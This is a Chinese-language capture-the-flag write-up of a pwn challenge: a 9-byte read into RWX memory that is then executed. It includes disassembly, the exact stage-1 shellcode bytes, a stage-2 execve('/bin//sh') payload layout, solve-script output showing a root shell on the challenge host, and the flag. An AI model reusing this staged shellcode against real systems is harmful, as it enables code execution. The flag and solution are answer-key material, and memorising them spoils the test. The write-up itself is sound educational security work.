## 1. 一句话结论

程序 `mmap` 了一块 **RWX** 内存，`read(0, buf, 9)` 只给 **9 字节**，
然后 `call rdx` 直接跳到这块内存执行。
**9 字节刚好够写一个 "再读一次 + 跳到新数据" 的 stage-1**，
stage-2 放 `execve("/bin//sh",0,0)`，拿 shell 读 flag。
这就是"九个字 / 两次回响"。

## 2. 静态分析

```
Arch: amd64-64-little | PIE: enabled | Full RELRO | No canary
NX: unknown (GNU_STACK missing) | GNU_STACK = RWE | Has RWX segments
SHSTK/IBT: Enabled (但 main 里 call rdx 的目标没有 endbr64，说明内核未启用 CET 强制)
```
源码文件名 `pwn3.c`，符号未 strip（`main` / `init`）。

`main` 反汇编（`objdump -d -M intel`，见 `evidence/18-checksec.txt`）：

```asm
120e <main>:
  ...  call init                       ; setvbuf(stdin/stdout/stderr,0,2,0)
  1224 mov r9d,0 ; r8d,-1 ; ecx,0x22 ; edx,0x7 ; esi,0x1000 ; edi,0
  1244 call mmap@plt                   ; mmap(NULL,0x1000,PROT_R|W|X,MAP_PRIVATE|ANON,-1,0)
  1249 mov [rbp-0x10],rax              ; p = mmap 结果
  1257 call puts@plt                   ; "What do you want to say ?"
  125c mov rax,[rbp-0x10]
  1260 mov edx,0x9      <-- 九个字 = 9 字节
  1265 mov rsi,rax
  1268 mov edi,0
  126d call read@plt                   ; read(0, p, 9)
  1272 mov rax,[rbp-0x10]
  1276 mov [rbp-8],rax
  127a mov rdx,[rbp-8]
  127e mov eax,0
  1283 call rdx         <-- 跳到 RWX 缓冲区执行
```

C 等价：

```c
int main(void) {
    init();
    void *p = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC,
                   MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    puts("What do you want to say ?");
    read(0, p, 9);          /* 只有 9 字节 */
    ((void (*)(void))p)();  /* call rdx */
    return 0;
}
```

`call rdx` 时的寄存器（gdb 实测，`evidence/18-gdb-registers.txt`）：

| reg | value | 备注 |
|---|---|---|
| rax | 0 | `mov eax,0` 紧接在 call 之前 |
| rdi | 0 | 第一次 read 的 fd |
| rsi | **0x7ffff7fb5000** | == mmap 缓冲区地址（read 之前 `mov rsi,rax`）|
| rdx | **0x7ffff7fb5000** | == mmap 缓冲区地址（不是 9！）|

**关键**：`rsi` 就是缓冲区自身地址 → stage-1 不需要 leak 地址，也不需要 ROP/PIE 基址。

## 3. 9 字节 stage-1 的两个坑（都踩过）

### 坑 1：第二次 read 会就地覆盖正在执行的 stage-1

最直觉的写法 `xor eax,eax; syscall; jmp rsi`（read 到 rsi=buf）会挂：

```
syscall 把 stage-2 写到 buf(=正在执行的那 9 字节)，
返回后 RIP 指向的 `jmp rsi` 已经被 stage-2 的字节覆盖 → SIGILL
```
实测：`rax=0x1a(26)`，`rip=0x…5007`，反汇编 `(bad)` —— 与推断完全一致。

### 坑 2：把 rsi 前移后，rdx 的巨大值让 read 直接 EFAULT

`mov sil,9` 让 rsi = buf+9 之后，`read(0, buf+9, rdx)` 里的 `rdx = 0x7ffff7fb5000`
（≈1.4e14）→ `access_ok()` 检查整个区间直接失败：

```
rax = 0xfffffffffffffff2  (-14 = -EFAULT)
```

### 解法：9 字节，自己把 rax/rdi/rdx 都摆好，并让 stage-2 把"续跳"带上

```
31 c0        xor  eax,eax        ; SYS_read
31 ff        xor  edi,edi        ; fd = 0
6a 7f        push 0x7f
5a           pop  rdx            ; count = 127（必须自己设，否则 EFAULT）
0f 05        syscall             ; read(0, rsi=buf, 127) —— 就地覆盖这 9 字节
```
正好 **9 字节**（`31c031ff6a7f5a0f05`）。`syscall` 返回时 **RIP = buf+9**。

`buf+9` 处现在是 stage-2 的第 9~10 字节，我们让它等于 `eb 00`（`jmp +0`）：

```
stage-2 = [9 字节填充(盖住 stage-1)] + "eb 00" + execve("/bin//sh",0,0)
        = 9 + 2 + 26 = 37 字节  (≤ 127 ✓)
```

于是控制流：`call rdx` → stage-1 → `read` 覆盖自己 → `RIP=buf+9` → `eb 00` → `buf+11`
→ 真正的 shellcode。

stage-1 与 stage-2 用**同一次 `send()`** 发出：第一次 `read(…,9)` 精确吃 9 字节，
剩下的留给 stage-1 触发的第二次 `read`，避免 TCP 分片导致第二次 read 只拿到半截。

## 5. 真实远程（已打通，已提交）

```bash
python3 scripts/18-solve.py nc1.ctfplus.cn 13656
# [+] Opening connection ... Done
# __BEGIN18__
# uid=0(root) gid=0(root) groups=0(root)          <-- 容器里直接就是 root
# 0xGame{Sh3llc0de_c4n_do_3v3ry7h1ng}
# __END18__
python3 scripts/ctfplus.py submit 18 '0xGame{Sh3llc0de_c4n_do_3v3ry7h1ng}'
# {"code":200,"msg":"OK","data":{"result":true}}
python3 scripts/ctfplus.py stop 18                  # 槽位已释放
# {"code":200,"msg":"OK","data":{"result":true}}
```

一次成功，无需调整。之前列的三个待确认项全部落实：

1. 远程就是同一份附件 —— 9 字节 stage-1 **原样生效**，脚本自己清零 `rax/rdi`，不依赖 caller 寄存器。
2. `/bin//sh` 存在，`execve` 成功（shell 里 `uid=0(root)`）。
3. **flag 路径 = `/home/ctf/flag`**（35 B）。注意 `/flag`、`/flag.txt` 都不存在；
   容器 cwd 是 `/home/ctf`，所以脚本里 `./flag` 和 `/home/*/flag` 命中同一个文件 → flag 被打印两次。
   **教训**：这台机器上「根目录没有 flag」是常态（16 号题同样在 `/home/ctf/flag`），
   以后同类题直接先 `cat /home/ctf/flag`。

> 若下次遇到没有 `/bin/sh` 的环境：stage-1 不用动，把 stage-2 换成 ORW
> （open/read/write）shellcode 即可，127 字节预算足够。
